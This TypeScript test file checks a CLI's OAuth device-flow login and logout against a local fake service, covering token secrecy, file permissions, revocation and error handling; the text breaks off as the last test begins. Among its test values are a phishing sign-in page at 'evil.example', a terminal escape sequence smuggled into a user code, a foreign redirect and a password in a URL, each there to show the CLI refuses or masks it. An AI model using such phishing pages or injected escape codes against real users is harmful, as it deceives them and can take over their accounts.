/**
 * `mason login` AND `mason logout` AGAINST A FAKE HOSTED SERVICE (no network: an http server of this test's on
 * 127.0.0.1, which plain http may name): the real CLI as a child process, its service `MASON_CLOUD_URL`, its home a temp
 * folder. The contract is docs/HOSTED-API.md; what each test holds is in its name. Every run's stdout and stderr is held
 * to never carrying a token the fake issued, nor MASON_TOKEN's value, whatever the run did (`mason`, and the last test).
 */
import { test, after } from "node:test";
import assert from "node:assert/strict";
import * as fs from "node:fs";
import * as http from "node:http";
import * as os from "node:os";
import * as path from "node:path";
import { spawn } from "node:child_process";
import { randomBytes } from "node:crypto";
import { fileURLToPath } from "node:url";
import { matrixEnv, runMason, type Answer } from "./cli-matrix.ts";
import { exitOf, FAILURE_CODES } from "../src/cli/command.ts";

const MAIN = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "src", "cli", "main.ts");

/** A token as the service documents them: a prefix, then 43 base64url characters. */
const newToken = (kind: "pat" | "ci" = "pat"): string => `masondata_${kind}_${randomBytes(32).toString("base64url")}`;

/** Every secret any run may have seen, and every answer: the last test holds them apart. */
const SECRETS: string[] = [];
const ANSWERS: Answer[] = [];
const made: string[] = [];
after(() => { for (const d of made) fs.rmSync(d, { recursive: true, force: true }); });

interface Req { at: number; method: string; path: string; headers: http.IncomingHttpHeaders; form: Record<string, string> }
type Reply = { status: number; body?: unknown; raw?: string; headers?: Record<string, string> } | "drop";
interface Script {
  device?: Reply;
  /** the n-th poll's answer (0-based) */
  token?: (n: number) => Reply;
  me?: Reply;
  revoke?: Reply;
}

/** The device code the fake hands out, by default: 1 s between polls, 60 s to approve, its pages on its own origin
 *  (`BASE` in any answer is the fake's own address). */
const BASE = "http://BASE";
const DEVICE = { device_code: "dev-code-1", user_code: "WDJBMJHT", verification_uri: `${BASE}/device`, verification_uri_complete: `${BASE}/device?user_code=WDJBMJHT`, expires_in: 60, interval: 1 };
const ME = { email: "ada@example.com", name: "Ada", orgs: [{ slug: "acme", name: "Acme Inc", role: "owner" }, { slug: "beta", name: "beta", role: "viewer" }] };
const pending: Reply = { status: 400, body: { error: "authorization_pending" } };
const granted = (token: string): Reply => ({ status: 200, body: { access_token: token, token_type: "Bearer", expires_in: 7776000 } });

/** A fake service: answers as `script` says, records every request. */
async function fakeService(script: Script): Promise<{ url: string; requests: Req[]; script: Script; close: () => Promise<void> }> {
  const requests: Req[] = [];
  let polls = 0;
  const server = http.createServer((req, res) => {
    let body = "";
    req.on("data", (b: Buffer) => { body += b.toString(); });
    req.on("end", () => {
      const p = new URL(req.url ?? "/", "http://x").pathname;
      requests.push({ at: Date.now(), method: req.method ?? "", path: p, headers: req.headers, form: Object.fromEntries(new URLSearchParams(body)) });
      const reply: Reply = p === "/oauth/device/code" ? script.device ?? { status: 200, body: DEVICE }
        : p === "/oauth/token" ? (script.token ?? (() => pending))(polls++)
        : p === "/v1/me" ? script.me ?? { status: 200, body: ME }
        : p === "/oauth/revoke" ? script.revoke ?? { status: 200, body: {} }
        : { status: 404, body: { error: { code: "not_found", message: "no such endpoint" }, next: [] } };
      if (reply === "drop") { req.socket.destroy(); return; }
      res.writeHead(reply.status, { "content-type": reply.raw === undefined ? "application/json" : "text/html", ...reply.headers });
      res.end(reply.raw ?? (reply.body === undefined ? "" : JSON.stringify(reply.body).replaceAll(BASE, `http://127.0.0.1:${port}`)));
    });
  });
  let port = 0;
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  port = (server.address() as { port: number }).port;
  return { url: `http://127.0.0.1:${port}`, requests, script, close: () => new Promise((resolve) => { server.closeAllConnections(); server.close(() => resolve()); }) };
}

/** A home of its own, for a run. */
function home(): string {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "mason-login-"));
  made.push(d);
  return fs.realpathSync(d);
}

/** The environment of a run: its home, its service, more (MASON_TOKEN). */
const envFor = (h: string, url: string, extra: Record<string, string> = {}): Record<string, string> => matrixEnv({ HOME: h, PATH: path.dirname(process.execPath), MASON_CLOUD_URL: url, ...extra });

/** Every step login and logout give, in every state: their own, never the service's. */
const OWN_STEP = /^ {2}(mason login|mason logout|env -u MASON_TOKEN mason login|unset MASON_CLOUD_URL|chmod (600|700) \S+)(\s|$)/;

/** One run, held at once to carrying no secret on either stream, and to the service's values never shaping it. */
async function mason(h: string, argv: string[], env: Record<string, string>, timeoutMs = 60_000): Promise<Answer> {
  const a = await runMason(h, argv, env, timeoutMs);
  ANSWERS.push(a);
  // whatever the service answered, a failure's code is one of the CLI's closed set and its exit that code's: the
  // service's words are shown, never the CLI's contract
  if (argv.includes("--json") && a.code !== 0) {
    const e = (JSON.parse(a.stdout) as { error?: { code?: string } }).error;
    assert.ok(e?.code !== undefined && Object.hasOwn(FAILURE_CODES, e.code), `mason ${argv.join(" ")}: code ${e?.code} is not one of FAILURE_CODES`);
    assert.equal(a.code, exitOf({ message: "", code: e.code }), `mason ${argv.join(" ")}: exit ${a.code}, where ${e.code} exits ${exitOf({ message: "", code: e.code })}`);
  }
  // whatever the service sent, its values never shape the output: no line begins with what a hostile value carried,
  // each stream has one Next: block at most, every step under it is the CLI's, and no --json string holds a line break
  for (const [stream, text] of [["stdout", a.stdout], ["stderr", a.stderr]] as const) {
    const lines = text.split("\n");
    assert.ok(!lines.some((l) => /^\s*FORGED/.test(l)), `mason ${argv.join(" ")}: a line of ${stream} begins with the service's text:\n${text}`);
    assert.ok(lines.filter((l) => l === "Next:").length <= 1, `mason ${argv.join(" ")}: ${stream} has more than one Next: block:\n${text}`);
    const at = lines.indexOf("Next:");
    if (at >= 0) for (const l of lines.slice(at + 1)) if (l.startsWith("  ") && !l.startsWith("   ")) assert.match(l, OWN_STEP, `mason ${argv.join(" ")}: a step the CLI does not give`);
  }
  if (argv.includes("--json")) {
    const walk = (v: unknown, at: string): void => {
      if (typeof v === "string") assert.doesNotMatch(v, /[\n\r\u0085\u2028\u2029]/, `mason ${argv.join(" ")} --json ${at} holds a line break: ${JSON.stringify(v)}`);
      else if (Array.isArray(v)) v.forEach((x, i) => walk(x, `${at}[${i}]`));
      else if (typeof v === "object" && v !== null) for (const [k, x] of Object.entries(v)) walk(x, `${at}.${k}`);
    };
    walk(JSON.parse(a.stdout), "");
    for (const n of (JSON.parse(a.stdout) as { next: Array<{ command: string }> }).next) assert.match(`  ${n.command}`, OWN_STEP, `mason ${argv.join(" ")} --json: a step the CLI does not give`);
  }
  for (const s of SECRETS) {
    assert.ok(!a.stdout.includes(s) && !a.stderr.includes(s), `mason ${argv.join(" ")} printed a secret:\n${a.stdout}\n${a.stderr}`);
    assert.ok(!a.stdout.includes(s.slice(-43)) && !a.stderr.includes(s.slice(-43)), `mason ${argv.join(" ")} printed a secret's body`);
  }
  return a;
}

const credentials = (h: string): string => path.join(h, ".config", "mason", "credentials.json");
const mode = (p: string): string => (fs.statSync(p).mode & 0o777).toString(8);
const saved = (h: string): { version: number; logins: Record<string, { token: string; email: string; savedAt: string }> } => JSON.parse(fs.readFileSync(credentials(h), "utf8"));
/** A credentials file written as a login would leave it. */
function writeSaved(h: string, logins: Record<string, { token: string; email: string; savedAt: string }>): void {
  fs.mkdirSync(path.dirname(credentials(h)), { recursive: true, mode: 0o700 });
  fs.chmodSync(path.dirname(credentials(h)), 0o700);
  fs.writeFileSync(credentials(h), JSON.stringify({ version: 1, logins }), { mode: 0o600 });
}

test("mason login: the page and the code on stderr at once, before it is approved; then signed in, its organisations a line each, saved 0600 in a 0700 folder", async () => {
  const token = newToken(); SECRETS.push(token);
  let approved = false;
  const fake = await fakeService({ token: () => approved ? granted(token) : pending });
  try {
    const h = home();
    const child = spawn(process.execPath, [MAIN, "login"], { cwd: h, env: envFor(h, fake.url), stdio: ["ignore", "pipe", "pipe"] });
    let stdout = "", stderr = "";
    child.stdout.on("data", (b: Buffer) => { stdout += b.toString(); });
    const seen = new Promise<void>((resolve) => child.stderr.on("data", (b: Buffer) => { stderr += b.toString(); if (stderr.includes("Waiting for the code")) resolve(); }));
    const closed = new Promise<number | null>((resolve) => child.on("close", resolve));
    await Promise.race([seen, new Promise((_, reject) => setTimeout(() => reject(new Error(`no code on stderr within 10 s:\n${stderr}`)), 10_000))]);
    // said while the service still answers pending: an agent can pass it on before the wait ends
    // and the service has answered a poll pending
    for (let i = 0; i < 100 && !fake.requests.some((r) => r.path === "/oauth/token"); i++) await new Promise((r) => setTimeout(r, 50));
    assert.ok(fake.requests.some((r) => r.path === "/oauth/token"), "a poll was answered pending");
    assert.equal(stdout, "", "nothing on stdout before it ends");
    assert.equal(stderr, `To sign in to ${fake.url}, open this page and approve the code:\n  page   ${fake.url}/device?user_code=WDJBMJHT\n  code   WDJB-MJHT (the page shows it: check they match)\n` +
      "Waiting for the code to be approved (it expires in 1 min; Ctrl-C stops) …\n");
    approved = true;
    const code = await closed;
    ANSWERS.push({ argv: ["login"], code, signal: null, stdout, stderr, ms: 0 });
    assert.equal(code, 0, stderr);
    assert.ok(!stdout.includes(token) && !stderr.includes(token));
    assert.equal(stdout, `Signed in to ${fake.url} as ada@example.com\n  name    Ada\n  orgs    acme (Acme Inc), owner\n          beta, viewer\n  saved   ${credentials(h)}\n\n` +
      `Next:\n  mason logout                                  sign this machine out of ${fake.url}\n`);
    assert.ok(stderr.endsWith("Approved\n"), stderr);
    // the file: the token under the service's base URL, 0600 in a 0700 folder
    assert.equal(mode(credentials(h)), "600");
    assert.equal(mode(path.dirname(credentials(h))), "700");
    const s = saved(h);
    assert.deepEqual(Object.keys(s), ["version", "logins"]);
    assert.deepEqual(Object.keys(s.logins), [fake.url]);
    assert.equal(s.logins[fake.url]!.token, token);
    assert.equal(s.logins[fake.url]!.email, "ada@example.com");
    assert.ok(!Number.isNaN(Date.parse(s.logins[fake.url]!.savedAt)));
    assert.deepEqual(fs.readdirSync(path.dirname(credentials(h))), ["credentials.json"], "nothing left beside it");
    // what it sent: the device code asked for as the CLI, this machine named; each poll the grant; /v1/me with the token
    const [first, ...rest] = fake.requests;
    assert.equal(first!.method, "POST");
    assert.equal(first!.path, "/oauth/device/code");
    assert.equal(first!.headers["content-type"], "application/x-www-form-urlencoded");
    assert.equal(first!.form.client_id, "mason-cli");
    assert.match(first!.form.device_name ?? "", /^[\x20-\x7e]{1,64}$/, "the hostname as printable ASCII, at most 64 characters");
    const polls = rest.filter((r) => r.path === "/oauth/token");
    assert.ok(polls.length >= 2, `${polls.length} polls`);
    for (const p of polls) assert.deepEqual(p.form, { grant_type: "urn:ietf:params:oauth:grant-type:device_code", device_code: "dev-code-1", client_id: "mason-cli" });
    const me = fake.requests.filter((r) => r.path === "/v1/me");
    assert.equal(me.length, 1);
    assert.equal(me[0]!.method, "GET");
    assert.equal(me[0]!.headers.authorization, `Bearer ${token}`);
    for (const r of fake.requests) {
      assert.equal(r.headers["user-agent"], "mason-cli/dev", r.path);
      assert.equal(r.headers.accept, "application/json", r.path);
      if (r.path !== "/v1/me") assert.equal(r.headers.authorization, undefined, `${r.path}: no token where none is owed`);
    }
  } finally { await fake.close(); }
});

test("mason login: slow_down adds 5 s to the interval, and the next polls keep it (RFC 8628 3.5)", { timeout: 60_000 }, async () => {
  const token = newToken(); SECRETS.push(token);
  const fake = await fakeService({ token: (n) => n === 0 ? { status: 400, body: { error: "slow_down" } } : n === 1 ? pending : granted(token) });
  try {
    const h = home();
    const a = await mason(h, ["login", "--json"], envFor(h, fake.url));
    assert.equal(a.code, 0, a.stdout + a.stderr);
    const at = fake.requests.filter((r) => r.path === "/oauth/token").map((r) => r.at);
    assert.equal(at.length, 3);
    const start = fake.requests[0]!.at;
    assert.ok(at[0]! - start >= 950, `the first poll waits the interval: ${at[0]! - start} ms`);
    assert.ok(at[1]! - at[0]! >= 5_950, `after slow_down, 1 + 5 s: ${at[1]! - at[0]!} ms`);
    assert.ok(at[2]! - at[1]! >= 5_950, `and the interval stays raised: ${at[2]! - at[1]!} ms`);
  } finally { await fake.close(); }
});

test("mason login --json: one object on stdout, in its declared shape; the page and the code on stderr", async () => {
  const token = newToken(); SECRETS.push(token);
  const fake = await fakeService({ token: () => granted(token) });
  try {
    const h = home();
    const a = await mason(h, ["login", "--json"], envFor(h, fake.url, { XDG_CONFIG_HOME: path.join(h, "xdg") }));
    assert.equal(a.code, 0, a.stderr);
    const file = path.join(h, "xdg", "mason", "credentials.json");
    assert.deepEqual(JSON.parse(a.stdout), { service: fake.url, email: "ada@example.com", name: "Ada", orgs: ME.orgs, file, replaced: null,
      next: [{ command: "mason logout", what: `sign this machine out of ${fake.url}` }] });
    assert.match(a.stderr, /\n {2}code {3}WDJB-MJHT /);
    assert.equal(mode(file), "600", "XDG_CONFIG_HOME's folder is the one used");
    assert.equal(fs.existsSync(credentials(h)), false);
  } finally { await fake.close(); }
});

test("mason login: access_denied is refused, expired_token and a code past expires_in time out (124), each with the way out, nothing saved", async () => {
  const cases: Array<{ script: Script; code: string; exit: number; message: string }> = [
    { script: { token: () => ({ status: 400, body: { error: "access_denied" } }) }, code: "refused", exit: 1, message: "the sign-in with code WDJB-MJHT was denied" },
    { script: { token: () => ({ status: 400, body: { error: "expired_token" } }) }, code: "timeout", exit: 124, message: "the code WDJB-MJHT expired before it was approved" },
    // the service never says expired: the CLI stops at expires_in itself
    { script: { device: { status: 200, body: { ...DEVICE, expires_in: 2 } } }, code: "timeout", exit: 124, message: "the code WDJB-MJHT expired before it was approved" },
  ];
  for (const c of cases) {
    const fake = await fakeService(c.script);
    try {
      const h = home();
      const j = await mason(h, ["login", "--json"], envFor(h, fake.url));
      assert.equal(j.code, c.exit, j.stdout + j.stderr);
      const v = JSON.parse(j.stdout) as { error: { code: string; message: string; fix: string }; next: Array<{ command: string }> };
      assert.deepEqual([v.error.code, v.error.message, v.next.map((n) => n.command)], [c.code, c.message, ["mason login"]]);
      assert.match(v.error.fix, /mason login again/);
      const t = await mason(h, ["login"], envFor(h, fake.url));
      assert.equal(t.code, c.exit);
      assert.match(t.stderr, new RegExp(`\\n✗ mason login: ${c.message}\\n {2}why {3}`));
      assert.equal(fs.existsSync(credentials(h)), false, "nothing saved");
    } finally { await fake.close(); }
  }
});

test("mason login: an answer outside the contract is a failure said by its status, never followed (a redirect) nor repeated (its body), never retried", async () => {
  const echoed = newToken(); SECRETS.push(echoed);
  const cases: Array<[Script, RegExp]> = [
    // the service's limit of sign-ins from one address: try again later, and no loop of retries
    [{ device: { status: 429, body: { error: "slow_down" } } }, /^http:\/\/127\.0\.0\.1:\d+ is limiting sign-ins from this address \(429\)$/],
    // a device_name the service refuses, and a body it cannot read
    [{ device: { status: 400, body: { error: "invalid_request", error_description: "device_name is not printable" } } }, /refused this sign-in \(invalid_request\) when a sign-in was asked for$/],
    [{ device: { status: 413, body: { error: "invalid_request" } } }, /refused this sign-in \(invalid_request\)/],
    [{ device: { status: 415, raw: "<html>unsupported media type</html>" } }, /answered POST \/oauth\/device\/code with 415, not JSON, where a sign-in was asked for$/],
    // a body that is not JSON, a token in it: named by its status, never shown
    [{ device: { status: 502, raw: `<html>bad gateway ${echoed}</html>` } }, /answered POST \/oauth\/device\/code with 502, not JSON, where a sign-in was asked for$/],
    [{ device: { status: 200, raw: "<html>a login page</html>" } }, /answered POST \/oauth\/device\/code with 200, not JSON, where a device code was expected$/],
    [{ device: { status: 302, headers: { location: "https://elsewhere.example/oauth/device/code" } } }, /answered POST \/oauth\/device\/code with a redirect \(302\)/],
    [{ device: { status: 200, body: { ...DEVICE, user_code: "\u001b[2Jx" } } }, /answered POST \/oauth\/device\/code with 200, where a device code was expected/],
    [{ device: { status: 200, body: { ...DEVICE, verification_uri: "ftp://BASE/device" } } }, /named a sign-in page on another address: ftp:\/\/$/],
    [{ device: { status: 503, body: { error: "temporarily_unavailable", error_description: "down for maintenance" } } }, /refused this sign-in \(temporarily_unavailable\)/],
    [{ token: () => ({ status: 200, body: { access_token: "has space", token_type: "Bearer" } }) }, /answered POST \/oauth\/token with 200, where a token was expected/],
  ];
  for (const [script, message] of cases) {
    const fake = await fakeService(script);
    try {
      const h = home();
      const a = await mason(h, ["login", "--json"], envFor(h, fake.url));
      assert.equal(a.code, 1, a.stdout + a.stderr);
      assert.match((JSON.parse(a.stdout) as { error: { message: string } }).error.message, message);
      assert.doesNotMatch(a.stdout + a.stderr, /\u001b|<html>/, "no control character, and nothing of a body outside the contract, reaches the output");
      assert.equal(fake.requests.filter((r) => r.path === "/oauth/device/code").length, 1, "asked once: a refusal is never retried");
      assert.equal(fake.requests.filter((r) => r.path === "/v1/me").length, 0);
      assert.equal(fs.existsSync(credentials(h)), false);
    } finally { await fake.close(); }
  }
});

test("mason login: a sign-in page on any origin but the service's own is refused, naming both, before it is printed, opened or polled", async () => {
  const cases: Array<[Partial<typeof DEVICE>, string]> = [
    [{ verification_uri: "https://evil.example/phish" }, "https://evil.example"],
    [{ verification_uri_complete: "https://evil.example/phish?user_code=WDJBMJHT" }, "https://evil.example"],
    // the same host on another port or scheme is another origin
    [{ verification_uri: "http://127.0.0.1:1/device" }, "http://127.0.0.1:1"],
    [{ verification_uri: "https://127.0.0.1/device" }, "https://127.0.0.1"],
  ];
  for (const [page, origin] of cases) {
    const fake = await fakeService({ device: { status: 200, body: { ...DEVICE, ...page } } });
    try {
      const h = home();
      const a = await mason(h, ["login", "--json"], envFor(h, fake.url));
      assert.equal(a.code, 1, a.stdout + a.stderr);
      const v = JSON.parse(a.stdout) as { error: { code: string; message: string; why: string } };
      assert.deepEqual([v.error.code, v.error.message], ["refused", `${fake.url} named a sign-in page on another address: ${origin}`]);
      assert.match(v.error.why, new RegExp(`only on the service's own address, ${fake.url.replace(/[.]/g, "\\.")}:`));
      assert.doesNotMatch(a.stderr, /phish|page {3}/, "the page is never printed");
      assert.deepEqual(fake.requests.map((r) => r.path), ["/oauth/device/code"], "never polled");
    } finally { await fake.close(); }
  }
});

test("MASON_CLOUD_URL: http:// to another host, a path, a query, a user or password, another scheme — each refused before any byte is sent, the password never shown", async () => {
  const fake = await fakeService({});
  try {
    const h = home();
    const port = new URL(fake.url).port;
    const cases: Array<[string, RegExp]> = [
      ["http://example.com", /^MASON_CLOUD_URL is not a URL Mason sends a login to: http:\/\/example\.com$/],
      [`http://127.0.0.2:${port}`, /^MASON_CLOUD_URL is not a URL Mason sends a login to: /],
      [`${fake.url}/api`, /^MASON_CLOUD_URL has a path after the service's address \(http:\/\/127\.0\.0\.1:\d+\)$/],
      [`${fake.url}/?key=hunter2secret`, /^MASON_CLOUD_URL has a query after the service's address \(http:\/\/127\.0\.0\.1:\d+\)$/],
      [`${fake.url}/x#hunter2secret`, /^MASON_CLOUD_URL has a path and a fragment after the service's address /],
      [`http://ada:hunter2secret@127.0.0.1:${port}`, /^MASON_CLOUD_URL carries a user or a password \(http:\/\/\*\*\*\*@127\.0\.0\.1:\d+\)$/],
      ["ftp://example.com", /^MASON_CLOUD_URL is not a URL Mason sends a login to: /],
      ["not a url :: hunter2secret@", /^MASON_CLOUD_URL is not a URL$/],
      ["", /^MASON_CLOUD_URL is set, and empty$/],
    ];
    for (const [url, message] of cases) {
      for (const cmd of ["login", "logout"]) {
        const a = await mason(h, [cmd, "--json"], envFor(h, fake.url, { MASON_CLOUD_URL: url }));
        assert.equal(a.code, 1, `${cmd} ${url}: ${a.stdout}${a.stderr}`);
        const v = JSON.parse(a.stdout) as { error: { code: string; message: string; fix: string } };
        assert.equal(v.error.code, "refused", url);
        assert.match(v.error.message, message, url);
        assert.doesNotMatch(a.stdout + a.stderr, /hunter2secret/, "a password in the URL is never shown");
        assert.match(v.error.fix, /unset it for https:\/\/app\.masondata\.ai/);
      }
    }
    assert.deepEqual(fake.requests, [], "nothing was sent");
    // a person reads the same refusal
    const t = await mason(h, ["login"], envFor(h, fake.url, { MASON_CLOUD_URL: "http://example.com" }));
    assert.equal(t.stderr, "✗ mason login: MASON_CLOUD_URL is not a URL Mason sends a login to: http://example.com\n" +
      "  why   http:// is taken only for this machine (127.0.0.1, ::1, localhost), and example.com is not it: the login would travel unencrypted\n" +
      "  fix   set MASON_CLOUD_URL to the service's address alone, such as https://app.masondata.ai (or http://127.0.0.1:<port> for one on this machine), or unset it for https://app.masondata.ai\n\n" +
      "Next:\n  unset MASON_CLOUD_URL                         use https://app.masondata.ai\n");
    // localhost and ::1 are this machine too: taken (and nothing listens there, so it fails to reach, not refused)
    for (const url of ["http://localhost:1", "http://[::1]:1"]) {
      const a = await mason(h, ["login", "--json"], envFor(h, fake.url, { MASON_CLOUD_URL: url }));
      assert.equal((JSON.parse(a.stdout) as { error: { message: string } }).error.message, `could not reach ${url}`, url);
    }
  } finally { await fake.close(); }
});

test("the credentials file: a file or folder others can read is refused with the exact chmod, one that cannot be parsed with its path — before any request, never overwritten", async () => {
  const token = newToken(); SECRETS.push(token);
  const fake = await fakeService({ token: () => granted(token) });
  try {
    const other = newToken(); SECRETS.push(other);
    for (const cmd of ["login", "logout"]) {
      // a file 0644
      let h = home();
      writeSaved(h, { [fake.url]: { token: other, email: "ada@example.com", savedAt: "2026-11-01T00:00:00.000Z" } });
      fs.chmodSync(credentials(h), 0o644);
      let a = await mason(h, [cmd, "--json"], envFor(h, fake.url));
      assert.equal(a.code, 1, a.stdout + a.stderr);
      let v = JSON.parse(a.stdout) as { error: { code: string; message: string; fix: string }; next: Array<{ command: string }> };
      assert.deepEqual([v.error.code, v.error.message, v.error.fix], ["refused", `${credentials(h)} can be read by other users of this machine (mode 644)`, `chmod 600 ${credentials(h)}`]);
      assert.equal(v.next[0]!.command, `chmod 600 ${credentials(h)}`);
      assert.equal(mode(credentials(h)), "644", "left as it was");
      // the folder 0755
      h = home();
      writeSaved(h, {});
      fs.chmodSync(path.dirname(credentials(h)), 0o755);
      a = await mason(h, [cmd, "--json"], envFor(h, fake.url));
      v = JSON.parse(a.stdout);
      assert.deepEqual([a.code, v.error.message, v.error.fix], [1, `${path.dirname(credentials(h))} can be read by other users of this machine (mode 755)`, `chmod 700 ${path.dirname(credentials(h))}`]);
      // a file that is not JSON: its path, and nothing of its text (it may hold a token)
      h = home();
      writeSaved(h, {});
      const broken = `{"version":1,"logins":{"x":{"token":"${other}"`;
      fs.writeFileSync(credentials(h), broken);
      a = await mason(h, [cmd, "--json"], envFor(h, fake.url));
      v = JSON.parse(a.stdout);
      assert.deepEqual([a.code, v.error.code, v.error.message], [1, "refused", `${credentials(h)} cannot be read as Mason's logins`]);
      assert.match(v.error.fix, /^move it aside \(mv .* .*\.bad\), then mason login: nothing was changed$/);
      assert.equal(fs.readFileSync(credentials(h), "utf8"), broken, "never overwritten");
      // a symbolic link is not followed
      h = home();
      writeSaved(h, {});
      fs.renameSync(credentials(h), `${credentials(h)}.real`);
      fs.symlinkSync(`${credentials(h)}.real`, credentials(h));
      a = await mason(h, [cmd, "--json"], envFor(h, fake.url));
      v = JSON.parse(a.stdout);
      assert.deepEqual([a.code, v.error.message], [1, `${credentials(h)} cannot be read as Mason's logins`]);
    }
    assert.deepEqual(fake.requests, [], "every refusal before any request: the person never approves a code for a login that cannot be kept");
    // a person reads the chmod as the way out
    const h = home();
    writeSaved(h, {});
    fs.chmodSync(credentials(h), 0o640);
    const t = await mason(h, ["login"], envFor(h, fake.url));
    assert.match(t.stderr, new RegExp(`^✗ mason login: .* can be read by other users of this machine \\(mode 640\\)\\n {2}why {3}it holds the login of a hosted Mason service: anyone who reads it can act as you there\\n {2}fix {3}chmod 600 `));
  } finally { await fake.close(); }
});

test("MASON_TOKEN: mason login is refused with the way to sign in anyway, nothing sent; mason logout removes the saved login and says it cannot remove the variable", async () => {
  const envToken = newToken("ci"); SECRETS.push(envToken);
  const saved1 = newToken(); SECRETS.push(saved1);
  const fake = await fakeService({});
  try {
    const h = home();
    const a = await mason(h, ["login", "--json"], envFor(h, fake.url, { MASON_TOKEN: envToken }));
    assert.equal(a.code, 1);
    const v = JSON.parse(a.stdout) as { error: { code: string; message: string; fix: string }; next: Array<{ command: string }> };
    assert.deepEqual([v.error.code, v.error.message, v.next.map((n) => n.command)], ["refused", "MASON_TOKEN is set in this environment, so a login would not be used", ["env -u MASON_TOKEN mason login"]]);
    assert.deepEqual(fake.requests, []);
    // logout: the saved login is revoked and removed; MASON_TOKEN is neither revoked nor sent
    writeSaved(h, { [fake.url]: { token: saved1, email: "ada@example.com", savedAt: "2026-11-01T00:00:00.000Z" } });
    const j = await mason(h, ["logout", "--json"], envFor(h, fake.url, { MASON_TOKEN: envToken }));
    assert.equal(j.code, 0, j.stdout + j.stderr);
    const o = JSON.parse(j.stdout) as Record<string, unknown>;
    assert.equal(o.environmentToken, true);
    assert.equal(o.signedOut, true);
    assert.deepEqual((fake.requests as Req[]).map((r) => r.form.token), [saved1]);
    const t = await mason(h, ["logout"], envFor(h, fake.url, { MASON_TOKEN: envToken }));
    assert.equal(t.code, 0);
    assert.match(t.stdout, /^This machine is not signed in to .*\n[\s\S]*\nTip: MASON_TOKEN is set in this environment, and every command still uses it: logout cannot remove an environment variable\./);
    assert.ok((fake.requests as Req[]).every((r) => !JSON.stringify(r).includes(envToken)), "MASON_TOKEN never sent by login or logout");
  } finally { await fake.close(); }
});

test("mason logout: revokes the token (RFC 7009 form), removes this service's login and keeps another's; not signed in is said, exit 0", async () => {
  const mine = newToken(); SECRETS.push(mine);
  const theirs = newToken(); SECRETS.push(theirs);
  const fake = await fakeService({});
  try {
    const h = home();
    const otherBase = "https://other.example";
    writeSaved(h, { [fake.url]: { token: mine, email: "ada@example.com", savedAt: "2026-11-01T00:00:00.000Z" }, [otherBase]: { token: theirs, email: "bo@example.com", savedAt: "2026-11-01T00:00:00.000Z" } });
    const a = await mason(h, ["logout"], envFor(h, fake.url));
    assert.equal(a.code, 0, a.stderr);
    assert.equal(a.stdout, `Signed out of ${fake.url}\n  account        ada@example.com\n  revoked        yes: the service takes this login no more\n  removed from   ${credentials(h)}\n\n` +
      `Next:\n  mason login                                   sign in to ${fake.url} again\n`);
    assert.deepEqual(fake.requests.map((r) => [r.method, r.path, r.headers["content-type"], r.form]), [["POST", "/oauth/revoke", "application/x-www-form-urlencoded", { token: mine, token_type_hint: "access_token", client_id: "mason-cli" }]]);
    assert.deepEqual(Object.keys(saved(h).logins), [otherBase], "another service's login stays");
    assert.equal(mode(credentials(h)), "600");
    const again = await mason(h, ["logout", "--json"], envFor(h, fake.url));
    assert.equal(again.code, 0);
    assert.deepEqual(JSON.parse(again.stdout), { service: fake.url, signedOut: false, email: null, revoked: null, revokeError: null, environmentToken: false, file: credentials(h),
      next: [{ command: "mason login", what: `sign this machine in to ${fake.url}` }] });
    assert.equal(fake.requests.length, 1, "nothing to revoke: nothing sent");
  } finally { await fake.close(); }
});

test("mason logout with the service down, or refusing: the login is still removed, exit 0, and it says plainly it was NOT revoked and how to revoke it", async () => {
  const token = newToken(); SECRETS.push(token);
  // a port nothing listens on: the fake, closed
  const down = await fakeService({});
  const url = down.url;
  await down.close();
  const h = home();
  writeSaved(h, { [url]: { token, email: "ada@example.com", savedAt: "2026-11-01T00:00:00.000Z" } });
  const a = await mason(h, ["logout", "--json"], envFor(h, url));
  assert.equal(a.code, 0, a.stdout + a.stderr);
  const v = JSON.parse(a.stdout) as Record<string, unknown>;
  assert.deepEqual([v.signedOut, v.revoked, v.email], [true, false, "ada@example.com"]);
  assert.match(String(v.revokeError), new RegExp(`^could not reach ${url.replace(/[.]/g, "\\.")} \\(ECONNREFUSED`));
  assert.deepEqual(saved(h).logins, {}, "removed here");
  writeSaved(h, { [url]: { token, email: "ada@example.com", savedAt: "2026-11-01T00:00:00.000Z" } });
  const t = await mason(h, ["logout"], envFor(h, url));
  assert.equal(t.code, 0);
  assert.match(t.stdout, new RegExp(`^Signed out of ${url} on this machine, but the login was NOT revoked\\n[\\s\\S]*\\n {2}revoked {8}no\\n`));
  assert.match(t.stdout, new RegExp(`\\nTip: The login was NOT revoked \\(could not reach .*\\), so it still works on the service until it expires: sign in to ${url} in a browser and revoke this machine's login there\\.\\n`));
  // a service that answers the revoke with 500, or drops it
  for (const revoke of [{ status: 500, body: {} }, { status: 400, body: { error: "invalid_request" } }, { status: 413, raw: "too large" }, { status: 415, raw: "unsupported" }, "drop"] as Reply[]) {
    const fake = await fakeService({ revoke });
    try {
      const h2 = home();
      writeSaved(h2, { [fake.url]: { token, email: "ada@example.com", savedAt: "2026-11-01T00:00:00.000Z" } });
      const r = await mason(h2, ["logout", "--json"], envFor(h2, fake.url));
      const o = JSON.parse(r.stdout) as Record<string, unknown>;
      assert.deepEqual([r.code, o.signedOut, o.revoked], [0, true, false], r.stdout);
      if (revoke !== "drop") assert.equal(o.revokeError, `${fake.url} answered POST /oauth/revoke with ${revoke.status}`);
      assert.deepEqual(saved(h2).logins, {});
    } finally { await fake.close(); }
  }
});

test("mason login again replaces this machine's login to that service and revokes the one it replaced", async () => {
  const old = newToken(); SECRETS.push(old);
  const token = newToken(); SECRETS.push(token);
  const fake = await fakeService({ token: () => granted(token) });
  try {
    const h = home();
    writeSaved(h, { [fake.url]: { token: old, email: "old@example.com", savedAt: "2026-11-01T00:00:00.000Z" } });
    const a = await mason(h, ["login", "--json"], envFor(h, fake.url));
    assert.equal(a.code, 0, a.stderr);
    assert.deepEqual((JSON.parse(a.stdout) as { replaced: unknown }).replaced, { email: "old@example.com", revoked: true });
    assert.equal(saved(h).logins[fake.url]!.token, token);
    assert.deepEqual(fake.requests.filter((r) => r.path === "/oauth/revoke").map((r) => r.form.token), [old]);
  } finally { await fake.close(); }
});

test("mason login: a /v1/ failure's words are the service's, its code, exit and next step the CLI's own by HTTP status, the service's next never read; a token in it masked; revoked, never saved", async () => {
  const token = newToken(); SECRETS.push(token);
